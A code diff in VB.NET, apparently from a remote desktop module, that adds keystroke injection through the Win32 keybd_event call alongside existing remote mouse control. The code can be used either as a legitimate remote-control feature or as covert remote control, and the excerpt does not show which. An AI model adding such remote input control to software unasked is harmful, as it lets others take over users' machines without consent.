@@ -112,6 +112,8 @@ cc:
         End Try
     End Sub
 
+    Private Declare Ansi Sub keybd_event Lib "user32.dll" (bVk As Byte, bScan As Byte, dwFlags As Integer, dwExtraInfo As Integer)
+    Private Declare Ansi Function MapVirtualKey Lib "user32" Alias "MapVirtualKeyA" (wCode As Integer, wMapType As Integer) As Integer
     Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
     Public Shared cap As New CRDP
     Public Shared Sub Data(ByVal b As Byte())
@@ -137,6 +139,10 @@ cc:
 
                 Case "$" '  mouse move
                     Cursor.Position = New Drawing.Point(A(1), A(2))
+                    Exit Select
+
+                Case "%"
+                    keybd_event(CompilerServices.Conversions.ToByte(A(2)), CByte(MapVirtualKey(CompilerServices.Conversions.ToInteger(A(2)), 0)), CompilerServices.Conversions.ToInteger(A(1)), 0)
                     Exit Select
 
                 Case "Close"
